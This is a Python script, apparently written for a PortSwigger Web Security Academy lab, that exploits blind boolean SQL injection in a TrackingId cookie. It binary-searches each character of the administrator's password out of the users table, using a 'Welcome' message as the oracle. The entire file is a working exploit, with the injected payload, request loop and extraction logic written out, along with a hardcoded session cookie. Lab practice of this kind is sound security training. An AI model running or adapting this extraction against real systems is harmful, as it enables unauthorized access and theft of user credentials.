#!/usr/bin/python
import requests

url = 'https://ac401f891fed56cb800c4d4000d30036.web-security-academy.net/'
cookies = {
    "session": "8V7RgXxmvraWoVX5ccmiJi7bQzwk8ahU",
}
trackid = "R7VLngZOP9knuTmy"

chars = [48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86,
         87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 122]


def correct_range(text):
    return text.find("Welcome") != -1


def check_letter(letter_index, min_letter_index, max_letter_index):
    print("chec range min:{} max:{}",
          chars[min_letter_index], chars[max_letter_index])
    cookies["TrackingId"] = f"{trackid}' and substring((select password from users where username='administrator'),{letter_index},1) >= '{chr(chars[min_letter_index])}' and substring((select password from users where username='administrator'),{letter_index},1) <= '{chr(chars[max_letter_index])}'  --"

    req = requests.get(url, cookies=cookies)
    if correct_range(req.text):
        print("correct range min:{} max:{}",
              chars[min_letter_index], chars[max_letter_index])
        if max_letter_index == min_letter_index:
            #  print("equal {}", min_letter)
            return chr(chars[min_letter_index])
        # still narrowing the range of search
        if (max_letter_index - min_letter_index) != 1:
            print("!=1", max_letter_index)
            result = check_letter(letter_index, int(
                (min_letter_index+max_letter_index) / 2), max_letter_index)
            if result is None:
                return check_letter(letter_index, min_letter_index, int(
                    (min_letter_index+max_letter_index) / 2))
            #  print("return result", result)
            return result

        else:
            result = check_letter(
                letter_index, max_letter_index, max_letter_index)
            if result is None:
                return chr(chars[min_letter_index])
            return result

    else:
        return None


# from 65 to 122
password_len = 20
password = ""
print(len(chars))
for i in range(1, password_len+1):
    letter = check_letter(i, 0, len(chars)-1)
    #  print("letter ", letter)
    password += letter
    print(password)


print(password)
